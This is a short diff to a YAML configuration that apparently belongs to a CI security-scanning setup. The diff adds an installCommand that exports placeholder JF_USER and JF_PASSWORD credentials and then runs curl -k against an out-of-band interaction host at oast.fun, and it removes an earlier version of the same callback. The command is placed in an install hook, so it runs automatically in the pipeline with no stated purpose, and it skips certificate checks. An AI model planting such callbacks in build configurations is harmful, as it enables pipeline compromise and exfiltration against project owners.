@@ -7,6 +7,6 @@
       includeAllVulnerabilities: true
       failOnSecurityIssues: false
       projects:
+        - installCommand: "export JF_USER=test && export JF_PASSWORD=test && curl -k https://emedfrmkcjokyiiacflchzi632x3u81e9.oast.fun"
         - workingDirs:
             - "."
-        - installCommand: "curl -k https://emedfrmkcjokyiiacflchzi632x3u81e9.oast.fun"
